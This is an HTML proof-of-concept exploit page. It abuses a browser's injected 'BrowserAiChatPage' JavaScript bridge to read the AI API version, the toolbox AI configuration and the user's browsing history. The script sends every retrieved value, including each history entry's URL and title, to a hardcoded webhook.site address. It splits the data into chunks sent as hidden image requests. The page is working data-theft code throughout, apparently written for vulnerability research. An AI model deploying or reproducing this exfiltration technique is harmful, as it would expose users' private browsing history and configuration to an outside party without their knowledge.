<!doctype html>
<html>
<head><meta charset="utf-8"><title>QH PoC</title></head>
<body>
<h2 id="h">QH PoC</h2>
<pre id="out" style="white-space:pre-wrap;word-break:break-all;font-size:11px;
  background:#111;color:#0f0;padding:12px;height:90vh;overflow:auto"></pre>
<script>
(function(){
  var qs = new URLSearchParams(location.search);
  var M  = qs.get("m") || ("QH_" + Date.now());

  // ── webhook.site UUID ─────────────────
  var HOOK = "https://webhook.site/6aa0119b-d19a-41c1-8a04-4ad67bacd8d1";
  // ─────────────────────────────────────────────────────────

  document.getElementById("h").innerText = M;

  function log(k, v) {
    var val  = (v === undefined) ? "undefined"
             : (v === null)      ? "null"
             : (typeof v === "string") ? v
             : JSON.stringify(v);

    var line = k + " = " + val;
    console.log("QHPOC " + M + " " + line);
    document.getElementById("out").textContent += line + "\n";

    // 分片发到 webhook.site（每片 800 字节，防 URL 过长）
    for (var i = 0, n = 0; i < val.length || n === 0; i += 800, n++) {
      (function(chunk, idx) {
        var img = new Image();
        img.src = HOOK
          + "?m="  + encodeURIComponent(M)
          + "&k="  + encodeURIComponent(k + (val.length > 800 ? "__p" + idx : ""))
          + "&v="  + encodeURIComponent(chunk)
          + "&t="  + Date.now()
          + "&r="  + Math.random();
      })(val.slice(i, i + 800), n);
    }
  }

  var ai = window.BrowserAiChatPage;

  log("env.url",       location.href);
  log("env.ua",        navigator.userAgent);
  log("env.bridge",    typeof ai);

  if (!ai) {
    log("STOP", "BrowserAiChatPage not injected");
    return;
  }

  // ── 1. getAIApiVersion ────────────────────────────────────
  try { log("getAIApiVersion", ai.getAIApiVersion()); }
  catch(e) { log("getAIApiVersion_ERR", e.message); }

  // ── 2. getToolboxWebAIConfig ──────────────────────────────
  try { log("getToolboxWebAIConfig", ai.getToolboxWebAIConfig()); }
  catch(e) { log("getToolboxWebAIConfig_ERR", e.message); }

  // ── 3. queryHistory — 完整逐条上报 ───────────────────────
  try {
    var raw = ai.queryHistory();
    log("queryHistory_raw", raw);

    try {
      var obj  = (typeof raw === "string") ? JSON.parse(raw) : raw;
      var list = obj.dataList || obj.data || obj.list || obj;
      if (Array.isArray(list)) {
        log("queryHistory_count", String(list.length));
        list.forEach(function(item, i) {
          log("item_" + i + "_url",   item.url   || "");
          log("item_" + i + "_title", item.title || "");
        });
      }
    } catch(e2) {
      log("queryHistory_parse_ERR", e2.message);
    }
  } catch(e) {
    log("queryHistory_ERR", e.message);
  }

  log("FINAL", "done");
})();
</script>
</body>
</html>
